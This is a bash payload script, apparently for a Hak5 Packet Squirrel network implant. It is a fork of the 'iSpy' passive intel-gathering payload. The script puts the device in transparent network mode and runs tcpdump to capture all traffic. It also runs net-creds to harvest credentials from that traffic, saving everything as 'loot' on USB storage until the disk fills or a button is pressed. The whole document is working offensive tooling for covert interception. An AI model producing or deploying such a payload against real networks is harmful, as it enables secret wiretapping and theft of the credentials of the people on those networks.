#!/bin/bash
#
# Title:		iSpy Passive Intel Gathering - Smidge fork

# Description:		Stripped back version of the infoskirmish iSpy payload,
#									removed dependencies on currently broken OpenWRT packages
#                 and added credentials sniffing courtesy of net-creds.

# Author: 		Smidge (based on work from infoskirmish.com)
# Version:		1.0
# Category:		sniffing
# Target: 		Any
# Net Mode:		Any (default: Transparent)

# LEDs
# SUCCESS:		Payload ended complete
# FAIL:			No USB storage found

lootPath="/mnt/loot/intel"			# Path to loot
mode="TRANSPARENT"				# Network mode we want to use
interface="eth0"				# Interface to listen on
Date=$(date +%Y-%m-%d-%H%M)			# Date format to use for log files
tcpdumplog="tcpdump_$Date.pcap"			# TCPDump log file name
netcredsLog="net-creds_$Date.txt"

function monitor_space() {
	while true
	do
		[[ $(df | grep /mnt | awk '{print $4}') -lt 10000 ]] && {
			kill $1
			LED G SUCCESS
			sync
			break
		}
		sleep 5
	done
}

function finish() {

	# Kill TCPDump
    echo "TCPDump ending pid=$1" >> $1/log.txt
	kill $1
	wait $1

	# Kill net-creds
	echo "net-creds ending pid=$2" >> $2/log.txt
	kill $2
	wait $2

	# I found that if this payload had been running awhile the next two steps may take a bit. It is useful to have some kind of indication
	# that the payload accepted your button push and is responding. Thus the rapid white blink.
	LED W VERYFAST

	sync

	# Indicate successful shutdown
	LED R SUCCESS
	sleep 1

	# Halt the system; turn off LED
	LED OFF
	halt
}

function run() {

	# Create loot directory
	mkdir -p $lootPath &> /dev/null

	# Start tcpdump on the specified interface
	tcpdump -i $interface -w $lootPath/$tcpdumplog &>/dev/null &
	tpid=$!

	# Log TCP Dump Start
	echo "TCPDump started pid=$tpid" >> $lootPath/log.txt

	# Log net-creds data
	python net-creds.py -i $interface -o $lootPath/$netcredsLog &
  netcredsid=$!

	# Log mailsnarf Start.
	echo "net-creds started pid=$netcredsid" >> $lootPath/log.txt

	# Wait for button to be pressed (disable button LED)
	NO_LED=true BUTTON
	finish $tpid $netcredsid
}


# This payload will only run if we have USB storage
if [ -d "/mnt/loot" ]; then

    # Set networking to TRANSPARENT mode and wait five seconds
    NETMODE $mode >> $lootPath/log.txt
    sleep 5

    # Lets make sure the interface the user wanted actually exisits.
    if [[ $(ifconfig |grep $interface) ]]; then

	   echo "" > $lootPath/log.txt

	   LED ATTACK
	   run &
	   monitor_space $! &
       
    else

	   # Interface could not be found; log it in ~/payload/switch1/log.txt
       	   ifconfig > $lootPath/log.txt
	   echo "Could not load interface $interface. Stopping..." >> $lootPath/log.txt
       
	   # Display FAIL LED 
	   LED FAIL

    fi

else

	# USB storage could not be found; log it in ~/payload/switch1/log.txt
	echo "Could not load USB storage. Stopping..." > log.txt

	# Display FAIL LED 
	LED FAIL

fi
